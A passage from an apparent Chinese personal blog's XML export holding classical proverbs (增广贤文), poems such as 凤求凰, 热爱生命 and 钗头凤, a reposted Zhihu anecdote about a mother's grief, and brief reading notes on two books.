br>一日春工十日粮，十日春工半年粮。<br>疏懒人没吃，勤俭粮满仓。<br>人亲财不亲，财利要分清。<br>十分伶俐使七分，常留三分与儿孙，<br>若要十分都使尽，远在儿孙近在身。<br>君子乐得做君子，小人枉自做小人。<br>好学者则庶民之子为公卿，不好学者则公卿之子为庶民。<br>惜钱莫教子，护短莫从师。<br>记得旧文章，便是新举子。<br>人在家中坐，祸从天上落。<br>但求心无愧，不怕有后灾。<br>只有和气去迎人，哪有相打得太平。<br>忠厚自有忠厚报，豪强一定受官刑。<br>人到公门正好修，留些阴德在后头。<br>为人何必争高下，一旦无命万事休。<br>山高不算高，人心比天高。<br>白水变酒卖，还嫌猪无糟。<br>贫寒休要怨，宝贵不须骄。<br>善恶随人作，祸福自己招。<br>奉劝君子，各宜守己。<br>只此呈示，万无一失。<br>（上集完）</p>
<h1 id="下集"><a href="#下集" class="headerlink" title="下集"></a>下集</h1><p>前人俗语，言浅理深。<br>补遗增广，集成书文。<br>世上无难事，只怕不专心。<br>成人不自在，自在不成人；<br>金凭火炼方知色，与人交财便知心。<br>乞丐无粮，懒惰而成。<br>勤俭为无价之宝，节粮乃众妙之门。<br>省事俭用，免得求人。<br>量大祸不在，机深祸亦深。<br>善为至宝深深用，心作良田世世耕。<br>群居防口，独坐防心。<br>体无病为富贵，身平安莫怨贫。<br>败家子弟挥金如土，贫家子弟积土成金。<br>富贵非关天地，祸福不是鬼神。<br>安分贫一时，本分终不贫。<br>不拜父母拜干亲，弟兄不和结外人。<br>人过留名，雁过留声。<br>择子莫择父，择亲莫择邻。<br>爱妻之心是主，爱子之心是亲。<br>事从根起，藕叶连心。<br>祸与福同门，利与害同城。<br>清酒红人脸，财帛动人心！<br>宁可荤口念佛，不可素口骂人。<br>有钱能说话，无钱话不灵。<br>岂能尽如人意？但求不愧吾心。<br>不说自己井绳短，反说他人箍井深。<br>恩爱多生病，无钱便觉贫。<br>只学斟酒意，莫学下棋心。<br>孝莫假意，转眼便为人父母。<br>善休望报，回头只看汝儿孙！<br>口开神气散，舌出是非生！<br>弹琴费指甲，说话费精神。<br>千贯买田，万贯结邻。<br>人言未必犹尽，听话只听三分。<br>隔壁岂无耳，窗外岂无人？<br>财可养生须注意，事不关己不劳心。<br>酒不护贤，色不护病；<br>财不护亲，气不护命！<br>一日不可无常业，安闲便易起邪心！<br>炎凉世态，富贵更甚于贫贱；<br>嫉妒人心，骨肉更甚于外人！<br>瓜熟蒂落，水到渠成。<br>人情送匹马，买卖不饶针！<br>过头饭好吃，过头话难听！<br>事多累了自己，田多养了众人。<br>怕事忍事不生事自然无事；<br>平心静心不欺心何等放心！<br>天子至尊不过于理，在理良心天下通行。<br>好话不在多说，有理不在高声！<br>一朝权在手，便把令来行。<br>甘草味甜人可食，巧言妄语不可听。<br>当场不论，过后枉然。<br>贫莫与富斗，富莫与官争！<br>官清难逃猾吏手，衙门少有念佛人！<br>家有千口，主事一人。<br>父子竭力山成玉，弟兄同心土变金。<br>当事者迷，旁观者清。<br>怪人不知理，知理不怪人。<br>未富先富终不富，未贫先贫终不贫。<br>少当少取，少输当赢！<br>饱暖思淫欲，饥寒起盗心！<br>蚊虫遭扇打，只因嘴伤人！<br>欲多伤神，财多累心！<br>布衣得暖真为福，千金平安即是春。<br>家贫出孝子，国乱显忠臣！<br>宁做太平犬，莫做离乱人！<br>人有几等，官有几品。<br>理不卫亲，法不为民。<br>自重者然后人重，人轻者便是自轻。<br>自身不谨，扰乱四邻。<br>快意事过非快意，自古败名因败事。<br>伤身事莫做，伤心话莫说。<br>小人肥口，君子肥身。<br>地不生无名之辈，天不生无路之人。<br>一苗露水一苗草，一朝天子一朝臣。<br>读未见书如逢良友，见已读书如逢故人。<br>福满须防有祸，凶多料必无争。<br>不怕三十而死，只怕死后无名。<br>但知江湖者，都是薄命人。<br>不怕方中打死人，只知方中无好人。<br>说长说短，宁说人长莫说短；<br>施恩施怨，宁施人恩莫施怨。<br>育林养虎，虎大伤人。<br>冤家抱头死，事要解交人。<br>卷帘归乳燕，开扇出苍蝇。<br>爱鼠常留饭，怜蛾灯罩纱。<br>人命在天，物命在人。<br>奸不通父母，贼不通地邻。<br>盗贼多出赌博，人命常出奸情。<br>治国信谗必杀忠臣，治家信谗必疏其亲。<br>治国不用佞臣，治家不用佞妇。<br>好臣一国之宝，好妇一家之珍。<br>稳的不滚，滚的不稳。<br>儿不嫌母丑，狗不嫌家贫。<br>君子千钱不计较，小人一钱恼人心。<br>人前显贵，闹里夺争。<br>要知江湖深，一个不做声。<br>知止自当出妄想，安贫须是禁奢心。<br>初入行业，三年事成；<br>初吃馒头，三年口生。<br>家无生活计，坐吃如山崩。<br>家有良田万顷，不如薄艺在身；<br>艺多不养家，食多嚼不赢。<br>命中只有八合米，走遍天下不满升。<br>使心用心，反害自身。<br>国家无空地，世上无闲人。<br>妙药难医怨逆病，混财不富穷命人。<br>耽误一年春，十年补不清；<br>人能处处能，草能处处生。<br>会打三班鼓，也要几个人。<br>人不走不亲，水不打不浑。<br>三贫三富不到老，十年兴败多少人！<br>买货买得真，折本折得轻；<br>不怕问到，只怕倒问。<br>人强不如货强，价高不如口便。<br>会买买怕人，会卖卖怕人。<br>只只船上有梢公，天子足下有贫亲。<br>既知莫望，不知莫向。<br>在一行，练一行；<br>穷莫失志，富莫癫狂。<br>天欲令其灭亡，必先让其疯狂。<br>梢长人胆大，梢短人心慌。<br>隔行莫贪利，久炼必成钢。<br>瓶花虽好艳，相看不耐长。<br>早起三光，迟起三慌。<br>未来休指望，过去莫思量；<br>时来遇好友，病去遇良方。<br>布得春风有夏雨，哈得秋风大家凉。<br>晴带雨伞，饱带饥粮。<br>满壶全不响，半壶响叮当。<br>久利之事莫为，众争之地莫往。<br>老医迷旧疾，朽药误良方；<br>该在水中死，不在岸上亡。<br>舍财不如少取，施药不如传方。<br>倒了城墙丑了县官，打了梅香丑了姑娘。<br>燕子不进愁门，耗子不钻空仓。<br>苍蝇不叮无缝蛋，谣言不找谨慎人。<br>一人舍死，万人难当。<br>人争一口气，佛争一炷香。<br>门为小人而设，锁乃君子之防。<br>舌咬只为揉，齿落皆因眶。<br>硬弩弦先断，钢刀刃自伤。<br>贼名难受，龟名难当。<br>好事他人未见讲，错处他偏说得长。<br>男子无志纯铁无钢，女子无志烂草无瓤。<br>生男欲得成龙犹恐成獐，生女欲得成凤犹恐成虎。<br>养男莫听狂言，养女莫叫离母。<br>男子失教必愚顽，女子失教定粗鲁。<br>生男莫教弓与弩，生女莫教歌与舞。<br>学成弓弩沙场灾，学成歌舞为人妾。<br>财交者密，财尽者疏。<br>婚姻论财，夫妻之道。<br>色娇者亲，色衰者疏。<br>少实胜虚，巧不如拙。<br>百战百胜不如无争，万言万中不如一默。<br>有钱不置怨逆产，冤家宜解不宜结。<br>近朱者赤，近墨者黑。<br>一个山头一只虎，恶龙难斗地头蛇。<br>出门看天色，进门看脸色。<br>商贾买卖如施舍，买卖公平如积德。<br>天生一人，地生一穴。<br>家无三年之积不成其家，国无九年之积不成其国。<br>男子有德便是才，女子无才便是德。<br>有钱难买子孙贤，女儿不请上门客。<br>男大当婚女大当嫁，不婚不嫁惹出笑话。<br>谦虚美德，过谦即诈。<br>自己跌倒自己爬，望人扶持都是假。<br>人不知己过，牛不知力大。<br>一家饱暖千家怨，一物不见赖千家。<br>当面论人惹恨最大，是与不是随他说吧！<br>谁人做得千年主，转眼流传八百家。<br>满载芝麻都漏了，还在水里捞油花！<br>皇帝坐北京，以理统天下。<br>五百年前共一家，不同祖宗也同华！<br>学堂大如官厅，人情大过王法。<br>找钱犹如针挑土，用钱犹如水推沙！<br>害人之心不可有，防人之心不可无！<br>不愁无路，就怕不做。<br>须向根头寻活计，莫从体面下功夫！<br>祸从口出，病从口入。<br>药补不如肉补，肉补不如养补。<br>思虑之害甚于酒色，日日劳力上床呼疾。<br>人怕不是福，人欺不是辱。<br>能言不是真君子，善处方为大丈夫！<br>为人莫犯法，犯法身无主。<br>姊妹同肝胆，弟兄同骨肉。<br>慈母多误子，悍妇必欺夫！<br>君子千里同舟，小人隔墙易宿。<br>文钱逼死英雄汉，财不归身恰是无。<br>妻子如衣服，弟兄似手足。<br>衣服补易新，手足断难续。<br>盗贼怨失主，不孝怨父母。<br>一时劝人以口，百世劝人以书。<br>我不如人我无其福，人不如我我常知足！<br>捡金不忘失金人，三两黄铜四两福。<br>因祸得福，求赌必输。<br>一言而让他人之祸，一忿而折平生之福。<br>天有不测风云，人有旦夕祸福。<br>不淫当斋，淡饱当肉。<br>缓步当车，无祸当福。<br>男无良友不知己之有过，女无明镜不知面之精粗。<br>事非亲做，不知难处。<br>十年易读举子，百年难淘江湖！<br>积钱不如积德，闲坐不如看书。<br>思量挑担苦，空手做是福。<br>时来易借银千两，运去难赊酒半壶。<br>天晴打过落雨铺，少时享过老来福。<br>与人方便自己方便，一家打墙两家好看。<br>当面留一线，过后好相见。<br>入门掠虎易，开口告人难。<br>手指要往内撇，家丑不可外传。<br>浪子出于祖无德，孝子出于前人贤。<br>货离乡贵，人离乡贱。<br>树挪死，人挪活。<br>在家千日好，出门处处难。<br>三员长者当官员，几个明人当知县？<br>明人自断，愚人官断。<br>人怕三见面，树怕一墨线。<br>村夫硬似铁，光棍软如棉。<br>不是撑船手，怎敢拿篙竿！<br>天下礼仪无穷，一人知识有限。<br>一人不得二人计，宋江难结万人缘。<br>家有三亩田，不离衙门前，乡间无强汉，衙门就饿饭。<br>人人依礼仪，天下不设官。<br>衙门钱，眼睛钱；<br>田禾钱，千万年。<br>诗书必读，不可做官。<br>为人莫当官，当官皆一般。<br>换了你我去，恐比他还贪。<br>官吏清廉如修行，书差方便如行善。<br>靠山吃山，种田吃田。<br>吃尽美味还是盐，穿尽绫罗还是棉。<br>一夫不耕，全家饿饭，一女不织，全家受寒。<br>金银到手非容易，用时方知来时难。<br>先讲断，后不乱，免得藕断丝不断。<br>听人劝，得一半。<br>不怕慢，只怕站。<br>逢快莫赶，逢贱莫懒。<br>谋事在人，成事在天！<br>长路人挑担，短路人赚钱。<br>宁卖现二，莫卖赊三。<br>赚钱往前算，折本往后算。<br>小小生意赚大钱，七十二行出状元。<br>自己无运至，却怨世界难。<br>胆大不如胆小，心宽甚如屋宽。<br>妻贤何愁家不富，子孙何须受祖田。<br>是儿不死，是财不散。<br>财来生我易，我去生财难。<br>十月滩头坐，一日下九滩。<br>结交一人难上难，得罪一人一时间。<br>借债经商，卖田还债；<br>赊钱起屋，卖屋还钱。<br>修起庙来鬼都老，拾得秤来姜卖完。<br>不嫖莫转，不赌莫看。<br>节食以去病，少食以延年。<br>豆腐多了是包水，梢公多了打烂船。<br>无口过是，无眼过难。<br>无身过易，无心过难。<br>不会凫水怨河湾，不会犁田怨枷担。<br>他马莫骑，他弓莫挽。<br>要知心腹事，但听口中言。<br>宁在人前全不会，莫在人前会不全。<br>事非亲见，切莫乱谈。<br>打人莫打脸，骂人莫骂短。<br>好言一句三冬暖，话不投机六月寒。<br>人上十口难盘，帐上万元难还。<br>放债如施，收债如讨。<br>告状讨钱，海底摸盐。<br>衙门深似海，弊病大如天。<br>银钱莫欺骗，牛马不好变。<br>好汉莫被人识破，看破不值半文钱。<br>狗咬对头人，雷打三世冤。<br>不卖香烧无剩钱，井水不打不满边。<br>事宽则园，太久则偏。<br>高人求低易，低人求高难。<br>有钱就是男子汉，无钱就是汉子难。<br>人上一百，手艺齐全。<br>难者不会，会者不难。<br>生就木头造就船，砍的没得车的圆。<br>心不得满，事不得全。<br>鸟飞不尽，话说不完。<br>人无喜色休开店，事不遂心莫怨天。<br>选婿莫选田园，选女莫选嫁奁。<br>红颜女子多薄命，福人出在丑人边。<br>人将礼义为先，树将花果为园。<br>临危许行善，过后心又变。<br>天意违可以人回，命早定可以心挽。<br>强盗口内出赦书，君子口中无戏言。<br>贵人语少，贫子话多。<br>快里须斟酌，耽误莫迟春。<br>读过古华佗，不如见症多。<br>东屋未补西屋破，前帐未还后又拖。<br>今年又说明年富，待到明年差不多。<br>志不同己，不必强合。<br>莫道坐中安乐少，须知世上苦情多。<br>本少利微强如坐，屋檐水也滴得多。<br>勤俭持家富，谦恭受益多。<br>细处不断粗处断，黄梅不落青梅落。<br>见钱起意便是贼，顺手牵羊乃为盗。<br>要做快活人，切莫寻烦恼。<br>要做长寿人，莫做短命事。<br>要做有后人，莫做无后事。<br>不经一事，不长一智。<br>宁可无钱使，不可无行止。<br>栽树要栽松柏，结交要结君子。<br>秀才不出门，能知天下事。<br>钱多不经用，儿多不耐死。<br>弟兄争财家不穷不止，妻妾争风夫不死不止。<br>男人有志，妇人有势。<br>夫人死百将临门，将军死一卒不至。<br>天旱误甲子，人穷误口齿。<br>百岁无多日，光阴能几时？<br>父母养其身，自己立其志。<br>待有余而济人，终无济人之日；<br>待有闲而读书，终无读书之时。<br>此书传后世，句句必精读，其中礼和义，奉劝告世人。<br>勤奋读，苦发奋，走遍天涯如游刃。<br>【新增广贤文】<br>尊师以重道，爱众而亲仁。<br>钱财如粪土，仁义值千金。<br>作事须循天理，出言要顺人心。<br>处富贵地，要矜持贫贱的痛痒，当少壮时，须体念衰老的辛酸。<br>孝当竭力，非徒养身。<br>鸦有反哺之孝，羊知跪乳之恩。<br>打虎还要亲兄弟，出阵还须父子兵。<br>父子和而家不败，弟兄和而家不分。<br>知己知彼，将心比心。<br>责人之心责己，爱己之心爱人。<br>贪爱沉溺即苦海，利欲炽燃是火坑。<br>随时莫起趋时念，脱俗休存矫俗心。<br>昼夜惜阴，夜坐惜灯。读书须用意，一字值千金。<br>平生不作皱眉事，世上应无切齿人。<br>近水知鱼性，近山识鸟音。<br>路遥知马力，日久见人心。<br>饶人不是痴汉，痴汉不会饶人。<br>不说自己桶索短，但怨人家箍井深。<br>美不美，乡中水；亲不亲，故乡人。<br>割不断的亲，离不开的邻。<br>但行好事，莫问前程。<br>钝鸟先飞，大器晚成。<br>一年之计在于春，一日之计在于寅。<br>一家之计在于和，一生之计在于勤。<br>无病休嫌瘦，身安莫怨贫。<br>岂能尽如人意，但求无愧人心。<br>偏听则暗，兼听则明。<br>耳闻是虚，眼见是实。<br>毋施小惠而伤大体，毋借公论而快私情。<br>毋以已长而形人之短，毋因已拙而忌人之能。<br>平日不作亏心事，半夜敲门心不惊。<br>牡丹花好空入目，枣花虽小结实成。<br>汝惟不矜，天下莫与汝争能；汝惟不伐，天下莫与汝争功。<br>明不伤察，直不过矫。<br>仁能善断，清能有容。<br>不自是而露才，不轻试以幸功。<br>受享不逾分外，修持不减分中。<br>肝肠煦若春风，虽囊乏一文，还怜茕独；<br>气骨清如秋水，纵家徒四壁，终傲王公。<br>早把甘旨勤奉养，夕阳光阴不多时。<br>得宠思辱，居安思危。<br>成名每在穷苦日，败事多因得意时。<br>许人一物，千金不移。<br>一言既出，驷马难追。<br>博学而笃志，切问而近思。<br>惜钱休教子，护短莫从师。<br>须知孺子可教，勿谓童子何知。<br>静坐常思已过，闲谈莫论人非。<br>三人同行，必有我师，择其善者而从，其不善者改之。<br>狎昵恶少，久必受其累；屈志老成，急则可相依。<br>心口如一，童叟无欺。人有善念，天必佑之。<br>过则无惮改，独则毋自欺。道吾好者是吾贼，<br>道吾恶者是吉师。<br>学不尚行，马牛而襟裾。<br>结交须胜已，似我不如无。<br>同君一席话，胜读十年书。<br>水至清，则无鱼；人至察，则无徒。<br>宁可正而不足，不可斜而有余。<br>认真还自在，作假费功夫。<br>是非朝朝有，不听自然无。<br>聪明逞尽，惹祸招灾。<br>富从升合起，贫因不算来。<br>用人不宜刻，刻则思效者去；交友不宜滥，滥则贡谀者来。<br>乐不可极，乐极生哀；欲不可纵，纵欲成灾。<br>言顾行，行顾言。<br>不作风波于世上，但留清白在人间。<br>勿因群疑而阻独见，勿任已意而废人言。<br>自处超然，处人蔼然。得意淡然，失意泰然。<br>由俭入奢易，由奢入俭难。<br>枯木逢春犹再发，人无两度再少年。<br>儿孙胜于我，要钱做甚么；儿孙不如我，要钱做甚么。<br>谦恭待人，忠厚传家。<br>不学无术，读书便佳。<br>与治同道罔不兴，与乱同事罔不亡。<br>居身务期质朴，训子要有义方。<br>富若不教子，钱谷必消灭。<br>贵若不教子，衣冠受不长。<br>人无远虑，必有近忧。<br>勿临渴而掘井，宜未雨而绸缪。<br>酒虽痒性还乱性，水能载舟亦覆舟。<br>克已者，触事皆成药石；尤人者，启口即是戈矛。<br>儿孙自有儿孙福，莫与儿孙做牛马。<br>深山毕竟藏猛虎，大海终须纳细流。<br>休向君子诌媚，君子原无私惠；休与小人为仇，小人自我对头。<br>登高必自卑，若涉远必自迩。<br>磨刀恨不利，刀利伤人指；求财恨不多，财多终累已。<br>居视其所亲，达视其所举；富视其所不为，贫视其所不取。<br>知足常足，终身不辱；知止常止，终身不耻。<br>君子爱财，取之有道；小人放利，不顾天理。<br>悖入亦悖出，害人终害已。<br>身欲出樊笼外，心要在腔子里。<br>勿偏信而为奸所欺，勿自任而为气所使。<br>使口不如自走，求人不如求已。<br>处骨肉之变，宜从容不宜激烈；当家庭之衰，宜惕厉不宜委靡。<br>务下学而上达，毋舍近而趋远。<br>量入为出，凑少成多。<br>溪壑易填，人心难满。<br>用人与教人，二者却相反，用人取其长，教人责其短。<br>仕宦芳规清、慎、勤，饮食要诀缓、暖、软。<br>留心学到古人难，立脚怕随流俗转。<br>凡是自是，便少一是。<br>有短护短，更添一短。<br>好问则裕，自用则小。<br>勿营华屋，勿作营巧。<br>若争小可，便失大道。<br>但能依本分，终须无烦恼。<br>有言逆于汝心，必求诸道；有言逊于汝志，必求诸非道。<br>吃得亏，坐一堆；要得好，大做小。<br>志宜高而身宜下，胆欲大而心欲小。<br>学者如禾如稻，不学者如蒿如草。<br>唇亡齿必寒，教弛富难保。<br>书中结良友，千载奇逢；门内产贤郎，一家活宝。<br>狗不嫌家贫，儿不嫌母丑。<br>勿贪意外之财，勿饮过量之酒。<br>进步便思退步，着手先图放手。<br>责善勿过高，当思其可从。<br>攻恶勿太严，要使其可受。<br>和气致祥，乖气致戾。<br>玩人丧德，玩物丧志。<br>门内有君子，门外君子至；门内有小人，门外小人至。<br>趋炎虽暖，暖后更觉寒增；食蔗能甘，甘余更生苦趣。<br>家庭和睦，蔬食尽有余欢；骨肉乖违，珍馐亦减至味。<br>先学耐烦，切莫使气。<br>性躁心粗，一生不济。<br>得时莫夸能，不遇休妒世。<br>物盛则必衰，有隆还有替。<br>路径仄处，留一步与人行；滋味浓时，减三分让人嗜。<br>为人要学大莫学小，志气一卑污了，品格难乎其高；<br>持家要学小莫学大，门面一 弄阔了，后来难乎其继。<br>三十不立，四十见恶，五十相将寻死路。<br>见怪不怪，怪乃自败。<br>一正压百邪，少见必多怪。<br>君子之交淡以成，小人之交甘以坏。<br>爱人者，人恒爱。敬人者，人恒敬。<br>损友敬而远，益友亲而敬。<br>善与人交，久而能敬。<br>过则相规，言而有信。<br>木受绳则直，人受柬则圣。<br>良药苦口利于病，忠言逆耳利于行。<br>智生识，识生断。当断不断，反受其乱。<br>一毫之恶，劝人莫作；一毫之善，与人方便。<br>难合亦难分，易亲亦易散。<br>传家二字耕与读，防家二字盗与奸，<br>倾家二字淫与赌，守家二字勤与俭。<br>不汲汲于富贵，不戚戚于贫贱。<br>素位而行，不尤不怨。<br>先达之人可尊也，不可比媚。<br>权势之人可远也，不可侮慢。<br>善有善报，恶有恶报，若有不报，日子未到。<br>贤者不炫已之长，君子不夺人所好。<br>救既败之事，如驭临岩之马，休轻加一鞭；<br>图垂成之功，如挽上滩之舟，莫稍停一棹。<br>大事不糊涂，小事不渗漏。<br>内藏精明，外示浑厚。<br>恩宜先淡而浓，先浓后淡者，人忘其惠；<br>威宜自严而宽，先宽后严者，人怨其酷。<br>以积货财之心积学问，则盛德日新；<br>以爱妻子之心爱父母，则孝行自笃。<br>学须静，才须学。<br>非学无以广才，非静无以成学。<br>不患老而无成，只怕幼而不学。<br>富贵如刀兵戈矛，稍放纵便销膏靡骨而不知；<br>贫贱如针砭药石，一忧勤即砥节砺行而不觉。<br>不矜细行，终累大德。<br>亲戚不悦，无务外交；<br>事不终始，无务多业。<br>民为邦本，本固邦宁。<br>安居饱食，天下太平。<br>临难勿苟免，临财勿苟得。<br>谗言不可听，听之祸殃结。<br>君听臣遭诛，父听子遭灭，夫妇听之离，<br>兄弟听之别，朋友听之疏，亲戚听之绝。<br>性天澄澈，即饥餐渴饮，无非康济身肠；<br>心地沉迷，纵演偈谈玄，总是播弄精魄。<br>芝兰生于深林，不以无人而不芳；<br>君子修其道德，不为穷困而改节。<br>廉官可酌贪泉水，志士不受嗟来食。</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>凤求凰</title>
    <url>/2017/11/02/%E6%9D%82%E4%BE%83/%E5%87%A4%E6%B1%82%E5%87%B0/</url>
    <content><![CDATA[<pre><code> 司马相如
</code></pre><p>有一美人兮，见之不忘。</p>
<p>一日不见兮，思之如狂。</p>
<p>凤飞翱翔兮，四海求凰。</p>
<p>无奈佳人兮，不在东墙。</p>
<p>将琴代语兮，聊写衷肠。</p>
<p>何日见许兮，慰我彷徨。</p>
<p>愿言配德兮，携手相将。</p>
<p>不得於飞兮，使我沦亡。</p>
<p>凤兮凤兮归故乡，遨游四海求其凰。</p>
<p>时未遇兮无所将，何悟今兮升斯堂！</p>
<p>有艳淑女在闺房，室迩人遐毒我肠。</p>
<p>何缘交颈为鸳鸯，胡颉颃兮共翱翔！</p>
<p>凰兮凰兮从我栖，得托孳尾永为妃。</p>
<p>交情通意心和谐，中夜相从知者谁？</p>
<p>双翼俱起翻高飞，无感我思使余悲。</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>热爱生命</title>
    <url>/2017/11/14/%E6%9D%82%E4%BE%83/%E7%83%AD%E7%88%B1%E7%94%9F%E5%91%BD/</url>
    <content><![CDATA[<p><strong>热爱生命</strong></p>
<p><em>汪国真</em></p>
<p>我不去想,</p>
<p>是否能够成功,</p>
<p>既然选择了远方,</p>
<p>便只顾风雨兼程。</p>
<p>我不去想,</p>
<p>能否赢得爱情,</p>
<p>既然钟情于玫瑰,</p>
<p>就勇敢地吐露真诚 。</p>
<p>我不去想,</p>
<p>身后会不会袭来寒风冷雨,</p>
<p>既然目标是地平线,</p>
<p>留给世界的只能是背影 。</p>
<p>我不去想,</p>
<p>未来是平坦还是泥泞,</p>
<p>只要热爱生命,</p>
<p>一切,都在意料之中。</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>被嫌弃的程序员的一生</title>
    <url>/2019/05/20/%E6%9D%82%E4%BE%83/%E8%A2%AB%E5%AB%8C%E5%BC%83%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E4%B8%80%E7%94%9F/</url>
    <content><![CDATA[<p><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/1.webp" alt></p>
<a id="more"></a>
<p><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/2.webp" alt><br><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/3.webp" alt><br><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/4.webp" alt><br><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/5.webp" alt><br><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/6.webp" alt><br><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/7.webp" alt><br><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/8.webp" alt><br><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/9.webp" alt><br><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/10.webp" alt><br><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/11.webp" alt><br><img src="/2019/05/20/杂侃/被嫌弃的程序员的一生/12.webp" alt></p>
<p>程序员从早前的一种职业发展至今，俨然已经成为大众眼中的「特殊物种」。关于程序员的调侃与段子也盛产于网络，常常引起全网围观。但是程序员说到底并不是「两耳不闻窗外事，一心只用敲代码」，他们也有生活和工作上的烦恼与曲折。他们的人生并不像外人羡慕的那样「精英」，甚至还会有一些「潦倒」。</p>
<p>有一部电影叫做「被嫌弃的松子的一生」，有人评价说：大多数女人不会过成松子，但或多或少有松子的影子。「被嫌弃的程序员的一生」同样如此：不是所有的程序员一生都是如此，但是某个阶段却似曾相似。</p>
<p>不管你处于人生的哪个阶段，也不管你是否后悔成为一名程序员。只愿还是程序员的你，喜乐安好！</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>钗头凤</title>
    <url>/2017/11/02/%E6%9D%82%E4%BE%83/%E9%92%97%E5%A4%B4%E5%87%A4/</url>
    <content><![CDATA[<p>钗头凤·红酥手<br>宋代：陆游</p>
<p>红酥手，黄縢酒，满城春色宫墙柳。东风恶，欢情薄。一怀愁绪，几年离索。错、错、错。<br>春如旧，人空瘦，泪痕红浥鲛绡透。桃花落，闲池阁。山盟虽在，锦书难托。莫、莫、莫！</p>
<p>钗头凤·世情薄<br>宋代：唐婉</p>
<p>世情薄，人情恶，雨送黄昏花易落。晓风干，泪痕残。欲笺心事，独语斜阑。难，难，难！<br>人成各，今非昨，病魂常似秋千索。角声寒，夜阑珊。怕人寻问，咽泪装欢。瞒，瞒，瞒！(装欢 通：妆)</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>思念到极致是什么感觉?</title>
    <url>/2021/06/11/%E6%9D%82%E4%BE%83/%E6%80%9D%E5%BF%B5%E5%88%B0%E6%9E%81%E8%87%B4%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%9F%E8%A7%89/</url>
    <content><![CDATA[<p>近日 , 一位网友的帖子让无数人感动泪崩。帖子中写到该网友无意中点进了已故 5 年多的高中同学的 QQ 空间 , 却发现自 2010 年同学不幸离世至今 5 年多的时间里 , 同学母亲一直坚持不断地在儿子的 QQ 空间留言板上留言。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/21601181/1623396895339-67cf7171-156a-42d3-a8fd-6c644c7e7ccc.jpeg" alt="image"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/21601181/1623396895340-f40dbbe1-4d30-4cad-91d6-d3933aee9809.jpeg" alt="image"></p>
<p>收获这么多赞很高兴，高兴这个世界上母爱是被大多数人拥有与认同的，希望在外漂泊的游子，包括有幸能够待在父母身边的人，珍惜过去的我们或曾忽略的财富，因为，有些东西，如果失去了，便不会再拥有。</p>
<p>作者：李旺</p>
<p>链接：<a href="https://www.zhihu.com/question/31914864/answer/89238580" target="_blank" rel="noopener">https://www.zhihu.com/question/31914864/answer/89238580</a></p>
<p>来源：知乎</p>
<p>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>东京一年</title>
    <url>/2018/07/04/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E4%B8%9C%E4%BA%AC%E4%B8%80%E5%B9%B4/</url>
    <content><![CDATA[<p><img src="https://i.imgur.com/W5gjUr8.jpg" alt></p>
<blockquote>
<h1 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h1></blockquote>
<p>蒋方舟，1989年出生于湖北襄阳。7岁开始写作，9岁写成散文集《打开天窗》。2008年被清华大学破格录取，次年在《人民文学》发表了《审判童年》，“将戏谑的口吻与犀利的质问、游戏的精神与坦诚的剖析熔于一炉”，获得第一届朱自清散文奖。2012年大学毕业后任《新周刊》副主编。代表作：杂文集《正在发育》《邪童正史》《我承认我不曾历经沧桑》、小说集《故事的结局早已写在开头》等。蒋方舟的写作展示了对自身和“被时代绑架的一代年轻人”的关切。</p>
<p>伊藤王树，1978年出生于日本，纪录片导演，作品曾获艾美奖提名。执导的《15岁离开家乡的歌》（冲绳少女离开故乡的故事）等纪录片陆续在日本上映。</p>
<blockquote>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1></blockquote>
<p>作者读的书很多,很多书尤其是日本人的书几乎都没有听过.着重看了关于日本性文化的描述,可能偷偷摸摸看的小电影都是真的。作者以日记体的形式写出来,第一次读这种类型的书，略显新奇.</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>天才在左 疯子在右</title>
    <url>/2019/07/09/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%A4%A9%E6%89%8D%E5%9C%A8%E5%B7%A6%E7%96%AF%E5%AD%90%E5%9C%A8%E5%8F%B3/</url>
    <content><![CDATA[<p><img src="/2019/07/09/读书笔记/天才在左疯子在右/s6340977.jpg" alt></p>
<a id="more"></a>
<h1 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h1><p>本书以访谈录的形式记载了生活在另一个角落的人群（精神病患者、心理障碍者等边缘人）深刻、视角独特的所思所想，让人们可以了解到疯子抑或天才真正的内心世界。此书是国内第一本具有人文情怀的精神病患谈访录。内容涉及生理学、心理学、佛学、宗教、量子物理、符号学以及玛雅文明和预言等众多领域。</p>
